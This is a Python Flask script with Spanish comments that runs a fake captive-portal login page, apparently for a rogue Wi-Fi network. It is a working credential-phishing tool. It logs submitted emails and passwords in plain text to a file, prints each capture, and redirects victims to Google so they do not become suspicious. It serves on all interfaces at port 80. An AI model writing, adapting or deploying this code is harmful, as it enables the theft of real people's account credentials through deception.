from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Ruta principal para mostrar el portal cautivo
@app.route('/')
def index():
    return render_template('index.html')

# Ruta de captura para recibir los datos del formulario
@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Simulación de base de datos (Guardar en TXT)
    with open("capturado.txt", "a") as f:
        f.write(f"Email: {email} | Password: {password}\n")
    
    print(f"[*] Datos capturados de: {email}")
    
    # Redirigir a una página real para no levantar sospechas
    return redirect("https://www.google.com")

if __name__ == '__main__':
    # El servidor debe escuchar en todas las interfaces de la red creada (0.0.0.0)
    app.run(host='0.0.0.0', port=80)